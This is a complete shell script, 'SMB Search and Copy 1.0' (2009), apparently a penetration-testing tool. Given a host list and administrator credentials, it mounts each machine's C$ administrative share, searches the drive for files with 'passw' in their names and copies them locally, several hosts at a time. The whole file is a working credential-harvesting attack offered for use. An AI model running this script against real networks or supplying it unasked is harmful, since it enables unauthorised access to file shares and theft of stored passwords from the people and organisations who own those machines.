#!/bin/sh
# Copyright (c) 2009, Nico Leidecker
# All rights reserved.
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#     * Redistributions of source code must retain the above copyright
#       notice, this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice, this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the organization nor the names of its contributors 
#       may be used to endorse or promote products derived from this software 
#       without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

HOSTS=hosts.txt
USER=administrator
PASS=password
FILE_DIR=copied_files
MAX_THREADS=10


#files matching this expression will be found and copied
FIND_EXPR="*passw*"

threads=0

banner()
{
cat<<EOF
-=[# SMB Search and Copy 1.0 #]=-
Copyright (C) 2009 Nico Leidecker - http://www.leidecker.info
EOF
}

usage()
{
cat<<EOF
	$0 -u user -p password -h hosts_file [OPTIONAL OPTIONS]
	
	MANDATORY OPTIONS:
	
	  -u username		
	  -p password
	  -f host_files		a file containing the target hosts (one host per line)
	
	OPTIONAL OPTIONS:
	
	  -t threads		number of threads
	  -d directory 		directory where the copied files should be stored
	  -h				show this message
EOF
exit
}

teardown()
{
	while [ $threads -gt "0" ] ; do
  		wait
  		threads=`expr $threads - 1`
	done
}

sig_int()
{
	echo "Caught Interrupt! waiting for running children to finish..."
	teardown
	exit
}

mount_share()
{
  host=$1
  mount_dir="$host-mnt"
  
  echo "[$host] trying..."
  
  # create directory structures

  if [ ! -d "$mount_dir" ] ; then
    mkdir "$mount_dir"
    if [ $? -ne "0" ] ;  then
      echo "[$host] cannot create directory structure\n";
      sleep 1
  	  return 1
    fi
  fi
  
  # mount c$ share
  mount -t smbfs //$USER:$PASS@$host/c\$/ "$mount_dir"
  if [ $? -eq "0" ] ; then
  
    # find and copy interesting files
    echo "[$host] looking for interesting files ..."
    find "$mount_dir" -type f -iname $FIND_EXPR | 
      while read F
      do 
        echo "[$host] Found file: $F"
		cp "$F" "$FILE_DIR/$host-`basename \"$F\"`"
      done   
    
    umount $mount_dir
    if [ $? -ne "0" ]; then
      echo "[$host] cannot umount directory"
      sleep 1
      return 1
    else 
      echo "[$host] done!"
    fi
  else
    echo "[$host] cannot mount share";
    rm -r $mount_dir
    sleep 1
    return 1
  fi

  # clean directory structure again
  rm -r $mount_dir
  return 0
}


# show fancy banner
banner

# parse command line options
while getopts u:p:f:t:d:h o; do
	  case "$o" in 
	    u)
	    	USER="$OPTARG";;
	    p)
	    	PASS="$OPTARG";;
	    f)
	    	HOSTS="$OPTARG";;
	    t)
	    	MAX_THREADS="$OPTARG";;
	    d)
	    	FILE_DIR="$OPTARG";;
	    h)	usage;;
		[?]) usage;;
	  esac
	done

# trap SIGINT
trap sig_int 2

if [ ! -f $HOSTS ] ; then
  echo "host file $HOSTS was not found"
  exit
fi

# create file directory if necessary
if [ ! -d "$FILE_DIR" ] ; then
  echo "$FILE_DIR does not exist; will create it."
  mkdir $FILE_DIR
  if [ $? -ne "0" ] ; then
    echo "cannot create file directory"
  	exit
  fi
fi

echo "Files will be copied from shares to '$FILE_DIR'"
echo "Authenticating as user '$USER' with password '$PASS'"
  
# loop through hosts
exec<$HOSTS
while read host
do
  if [ $threads -lt $MAX_THREADS ] ; then
    threads=`expr $threads + 1`
    (mount_share $host)&
  fi

  if [ $threads -eq $MAX_THREADS ] ; then
    teardown
  fi
done

teardown
